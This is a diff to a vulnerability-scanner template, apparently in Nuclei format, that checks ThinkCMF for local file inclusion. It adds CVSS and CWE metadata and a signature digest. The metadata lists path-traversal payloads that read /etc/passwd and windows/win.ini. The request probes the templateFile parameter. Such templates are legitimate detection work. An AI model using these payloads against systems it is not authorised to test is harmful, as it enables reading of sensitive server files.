@@ -1,23 +1,29 @@
 id: thinkcmf-lfi
 
 info:
-  name: ThinkCMF LFI
+  name: ThinkCMF - Local File Inclusion
   author: pikpikcu
   severity: high
-  reference: https://www.freebuf.com/vuls/217586.html
-  tags: thinkcmf,lfi
+  description: ThinkCMF is vulnerable to local file inclusion.
+  reference:
+    - https://www.freebuf.com/vuls/217586.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-23,CWE-73
   metadata:
-    win-payload: "../../../../../../../../../../../../../../../../windows/win.ini"
-    unix-payload: "../../../../../../../../../../../../../../../../etc/passwd"
+    max-request: 1
+    win-payload: ../../../../../../../../../../../../../../../../windows/win.ini
+    unix-payload: ../../../../../../../../../../../../../../../../etc/passwd
+  tags: thinkcmf,lfi,vuln
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?a=display&templateFile=README.md"
 
     matchers-condition: and
     matchers:
-
       - type: word
         condition: and
         words:
@@ -28,3 +34,4 @@ requests:
       - type: status
         status:
           - 200
+# digest: 4b0a00483046022100dd2ae845c411e68e3a9e94d8990f26e2724752ac7c1a289fa99d158db9d40094022100d7c30340a15c0d70484042e851c28f92ee01065908c37f8b4523ffca09a8fb45:922c64590222798bb761d5b6d8e72950
